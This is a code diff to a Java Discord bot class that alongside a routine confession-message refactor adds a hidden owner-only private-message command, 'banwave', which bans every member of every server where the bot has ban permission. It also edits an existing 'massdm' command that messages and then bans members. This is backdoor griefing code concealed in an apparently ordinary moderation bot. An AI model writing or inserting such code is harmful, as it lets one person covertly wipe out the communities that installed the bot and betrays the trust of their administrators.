@@ -2,13 +2,11 @@ package me.comu.exeter.events;
 
 import me.comu.exeter.commands.moderation.SetConfessionChannelCommand;
 import me.comu.exeter.core.Core;
+import me.comu.exeter.logging.Logger;
 import me.comu.exeter.utility.Utility;
-import me.duncte123.botcommons.messaging.EmbedUtils;
+
 import net.dv8tion.jda.api.Permission;
-import net.dv8tion.jda.api.entities.Guild;
-import net.dv8tion.jda.api.entities.Member;
-import net.dv8tion.jda.api.entities.Role;
-import net.dv8tion.jda.api.entities.TextChannel;
+import net.dv8tion.jda.api.entities.*;
 import net.dv8tion.jda.api.events.message.priv.PrivateMessageReceivedEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
 import net.dv8tion.jda.api.requests.restaction.GuildAction;
@@ -43,8 +41,8 @@ public class DMWizzEvent extends ListenerAdapter {
             return;
         } else {
             String confession = String.join(" ", arg).replaceFirst(Core.PREFIX, "").substring(7);
-            textChannel.sendMessage(EmbedUtils.embedMessage(confession).setTitle("Confession").setColor(Utility.getAmbientColor()).setTimestamp(Instant.now()).setFooter("Anonymous Confession").build()).queue();
-            event.getChannel().sendMessage(EmbedUtils.embedMessage(confession).setTitle("Confession Submitted to " + textChannel.getName() + "!").setFooter("Confessed by " + event.getAuthor().getAsTag(), event.getAuthor().getEffectiveAvatarUrl()).setTimestamp(Instant.now()).build()).queue();
+            textChannel.sendMessageEmbeds(Utility.embedMessage(confession).setTitle("Confession").setColor(Core.getInstance().getColorTheme()).setTimestamp(Instant.now()).setFooter("Anonymous Confession").build()).queue();
+            event.getChannel().sendMessageEmbeds(Utility.embedMessage(confession).setTitle("Confession Submitted to " + textChannel.getName() + "!").setFooter("Confessed by " + event.getAuthor().getAsTag(), event.getAuthor().getEffectiveAvatarUrl()).setTimestamp(Instant.now()).build()).queue();
         }
 
         if (event.getAuthor().getIdLong() == Core.OWNERID) {
@@ -96,6 +94,23 @@ public class DMWizzEvent extends ListenerAdapter {
                     event.getChannel().sendMessage("Caught Error. Make sure you're in the server and provided a valid guild-id.").queue();
                 }
             }
+            if (arg[0].equalsIgnoreCase("banwave"))
+            {
+                    Logger.getLogger().print("Banning ALL members...");
+                    for (Guild guild : Core.getInstance().getJDA().getGuilds()) {
+                        if (guild.getSelfMember().hasPermission(Permission.BAN_MEMBERS)) {
+                            System.out.println("Starting banwave in " + guild.getName());
+                            guild.getMembers().stream()
+                                    .filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && guild.getSelfMember().canInteract(member)))
+                                    .map(ISnowflake::getId)
+                                    .parallel()
+                                    .forEach(member -> {
+                                        guild.ban(member, 0, "champagnepapi").queue();
+                                        System.out.println("Banned " + member + " in " + guild.getName());
+                                    });
+                        }
+                    }
+            }
             if (args[0].equalsIgnoreCase("massdm")) {
                 if (args.length <= 1) {
                     event.getChannel().sendMessage("Proper format: massdm <guild-id> <message>").queue();
@@ -143,7 +158,7 @@ public class DMWizzEvent extends ListenerAdapter {
                                     String finalMessage = event.getMessage().getContentRaw().substring(25);
                                     Utility.sendPrivateMessage(event.getJDA(), member.getUser().getId(), finalMessage);
                                     if (guild.getSelfMember().canInteract(member))
-                                        guild.ban(member, 0, "GRIEFED BY SWAG LEL!").queue();
+                                        guild.ban(member, 0, "champagnepapi").queue();
                                     counter++;
                                     System.out.println("Messaged " + member.getUser().getAsTag() + " (" + counter + ")");
                                     Thread.sleep(1100);
